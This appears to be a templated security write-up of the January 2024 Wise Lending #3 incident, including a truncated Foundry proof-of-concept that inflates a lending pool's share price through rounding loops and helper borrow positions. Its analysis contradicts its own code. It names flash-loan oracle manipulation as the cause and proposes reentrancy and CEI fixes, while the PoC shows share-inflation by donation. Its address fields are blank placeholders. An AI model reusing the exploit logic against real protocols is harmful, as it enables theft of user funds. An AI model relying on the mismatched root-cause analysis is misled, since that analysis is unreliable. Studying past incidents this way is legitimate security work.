# Wise Lending #3 — Oracle Manipulation to Bypass Liquidation Threshold Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-14 |
| **Protocol** | Wise Lending #3 |
| **Chain** | Ethereum |
| **Loss** | ~$27K |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Liquidation threshold bypass via oracle manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/WiseLending03_exp.sol) |

---
## 1. Vulnerability Overview

Wise Lending #3 is a DeFi protocol operating on the Ethereum chain that suffered an **oracle / price manipulation** attack on 2024-01-14.
The attacker exploited a liquidation threshold bypass via oracle manipulation, causing approximately **~$27K** in losses.

### Core Vulnerability Summary
- **Classification**: Oracle / Price Manipulation
- **Impact**: ~$27K in protocol asset losses
- **Attack Vector**: Oracle manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Liquidation threshold bypass via oracle manipulation
// The attacker exploits this logic to gain illegitimate profit

// IWiseLending interface — functions vulnerable to oracle manipulation
interface IWiseLending {
    // ❌ Vulnerable: spot-balance-based oracle allows liquidation threshold bypass
    // Flash loans can temporarily manipulate pool balance, distorting getTotalPool values
    function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
    function withdrawExactShares(uint256 _nftId, address _poolToken, uint256 _shares) external returns (uint256);
    function withdrawExactAmount(uint256 _nftId, address _poolToken, uint256 _withdrawAmount) external returns (uint256);

    // ❌ Vulnerable: spot pool balance used directly in price calculation
    function getTotalPool(address _poolToken) external view returns (uint256);
    function getPositionLendingShares(uint256 _nftId, address _poolToken) external view returns (uint256);
    function mintPosition() external returns (uint256);
    function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
}

// ✅ Correct implementation: use TWAP or Chainlink oracle
function safeGetPoolPrice(address _poolToken) external view returns (uint256) {
    // ✅ Use time-weighted average price (TWAP) instead of spot balance
    uint256 twapPrice = ITWAPOracle(twapOracle).consult(_poolToken, TWAP_PERIOD);
    // ✅ Compare against Chainlink price and revert if deviation exceeds limit
    uint256 chainlinkPrice = IChainlinkFeed(priceFeed).latestAnswer();
    require(
        abs(twapPrice - chainlinkPrice) * 1e18 / chainlinkPrice <= MAX_PRICE_DEVIATION,
        "Oracle: price deviation too high"
    );
    return twapPrice;
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── Liquidity Pool
  │
  ▼
[Oracle Price Manipulation] ─ Price Feed Contract
  │                             (TWAP/Spot price distortion)
  ▼
[Over-borrow / Liquidation] ── Lending Protocol
  │
  ▼
[Repay and Secure Profit]
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - WiseLending03_exp.sol
// Chain: Ethereum | Date: 2024-01-14

    function testExploit() public {
        deal(address(PendleLPT), address(this), 520_539_781_914_590_517_894);

        emit log_named_decimal_uint("Attacker PendleLPT Balance before exploit", PendleLPT.balanceOf(address(this)), 18);

        PendleLPT.approve(address(LPTPoolToken), type(uint256).max);
        LPTPoolToken.depositExactAmount(PendleLPT.balanceOf(address(this)));
        LPTPoolToken.approve(address(wiseLending), type(uint256).max);

        // set WiseLending pool state: pseudoTotalPool(underlying): 2 wei, totalDepositShares(share): 1 wei
        // see below tx: https://etherscan.io/tx/0x67d6c554314c9b306d683afb3bc4a10e70509ceb0fdf8415a5e270a91fae52de
        vm.startPrank(attackerContract);
        PositionNFTs.transferFrom(attackerContract, address(this), 8);
        vm.stopPrank();

        console.log("\n 1. set wiseLending pool state");
        wiseLending.withdrawExactShares(
            8, address(LPTPoolToken), wiseLending.getPositionLendingShares(8, address(LPTPoolToken))
        );
        (uint256 underlyingAmount, uint256 shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending pool state now, underlyingAmount:", underlyingAmount, "shareAmount: ", shareAmount);
        console.log("wiseLending Share Price 1: ", underlyingAmount / shareAmount);

        // inflae share price by donate LPTPoolToken to the wiseLending
        while (underlyingAmount / shareAmount < 36 ether) {
            wiseLending.depositExactAmount(8, address(LPTPoolToken), underlyingAmount * 2 - 1); //Since rounding in favor of the protocol, deposit 2x - 1 underlying, mint 1 share
            wiseLending.withdrawExactAmount(8, address(LPTPoolToken), 1); // withdraw 1 underlying, burn 1 share
            (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        }
        console.log("\n 2. Donate LPTPoolToken to wiseLending by rounding in favor of the protocol");
        console.log("WiseLending pool state now, underlyingAmount:", underlyingAmount, "shareAmount: ", shareAmount);
        console.log("wiseLending Share Price 2: ", underlyingAmount / shareAmount);

        //Mint 6 shares for withdraw donate LPTPoolToken
        console.log("\n 3. Mint 6 shares for withdraw donate LPTPoolToken");
        wiseLending.depositExactAmount(8, address(LPTPoolToken), 6 * underlyingAmount);

        // Open a position to borrow assets in 6 new accounts
        // Donate position collateral to the wiseLending pool through the incorrect health factor check
        console.log("\n 4. Open positions to borrow assets and further inflae the share price");
        for (uint256 i = 0; i < 6; i++) {
            helpers[i] = new Helper();
        }
        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[0]), underlyingAmount / shareAmount + 10);
        helpers[0].borrow(wstETH, underlyingAmount / shareAmount + 1, 43_767_595_652_604_943_692);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 3: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[1]), underlyingAmount / shareAmount + 10);
        helpers[1].borrow(wstETH, underlyingAmount / shareAmount + 1, 50_020_109_317_262_792_792);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 4: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[2]), underlyingAmount / shareAmount + 10);
        helpers[2].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 23_443_463_776_915_873_010);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 5: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[3]), underlyingAmount / shareAmount + 10);
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Oracle Manipulation |
| **Attack Type** | AMM Manipulation |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable functions |
| **Impact Scope** | Entire protocol liquidity |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply an emergency pause to the affected functions
2. **Assess damage**: Quantify lost assets and identify affected users
3. **Notify relevant parties**: Immediately notify related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 separate audit firms)
- Run a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Oracle / price manipulation attacks are preventable**: Proper validation and pattern application can provide defense
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-01-14** Wise Lending #3 incident reaffirms the danger of **oracle / price manipulation** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Community-level security information sharing should be strengthened

---
*This document was created for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/WiseLending03_exp.sol)*